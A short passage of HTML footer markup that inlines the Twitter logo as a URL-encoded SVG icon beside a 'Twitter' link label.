style="--icon:url(&#34data:image/svg+xml,%3Csvg role='img' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3ETwitter%3C/title%3E%3Cpath d='M21.543 7.104c.015.211.015.423.015.636 0 6.507-4.954 14.01-14.01 14.01v-.003A13.94 13.94 0 0 1 0 19.539a9.88 9.88 0 0 0 7.287-2.041 4.93 4.93 0 0 1-4.6-3.42 4.916 4.916 0 0 0 2.223-.084A4.926 4.926 0 0 1 .96 9.167v-.062a4.887 4.887 0 0 0 2.235.616A4.928 4.928 0 0 1 1.67 3.148 13.98 13.98 0 0 0 11.82 8.292a4.929 4.929 0 0 1 8.39-4.49 9.868 9.868 0 0 0 3.128-1.196 4.941 4.941 0 0 1-2.165 2.724A9.828 9.828 0 0 0 24 4.555a10.019 10.019 0 0 1-2.457 2.549z'/%3E%3C/svg%3E&#34)" class=icon></i> <span>Twitter</span> </a></ul></footer>